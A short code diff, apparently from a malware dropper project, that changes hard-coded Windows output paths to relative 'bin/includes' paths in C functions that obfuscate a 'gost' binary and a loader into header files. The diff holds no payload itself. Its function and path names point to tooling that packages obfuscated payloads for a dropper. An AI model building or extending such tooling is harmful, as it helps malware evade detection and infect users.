@@ -76,7 +76,7 @@ int obfuscate_gost_file(const char *input_path) {
     int file_index = 1;
 
     char name[64];
-    snprintf(name, sizeof(name), "D:/linuxmal/gostInit/windows/droper/includes/gostData_%d.h", file_index);
+    snprintf(name, sizeof(name), "bin/includes/gostData_%d.h", file_index);
     FILE *fo = fopen(name, "w");
     if (!fo) {
         perror("output");
@@ -114,7 +114,7 @@ int obfuscate_gost_file(const char *input_path) {
                 fclose(fo);
 
                 file_index++;
-                snprintf(name, sizeof(name), "D:/linuxmal/gostInit/windows/droper/includes/gostData_%d.h", file_index);
+                snprintf(name, sizeof(name), "bin/includes/gostData_%d.h", file_index);
                 fo = fopen(name, "w");
                 if (!fo) {
                     perror("output");
@@ -273,6 +273,6 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    obfuscate_loader_file(argv[2], "D:/linuxmal/gostInit/windows/droper/includes/loaderData.h");
+    obfuscate_loader_file(argv[2], "bin/includes/loaderData.h");
     obfuscate_gost_file(argv[4]);
 }
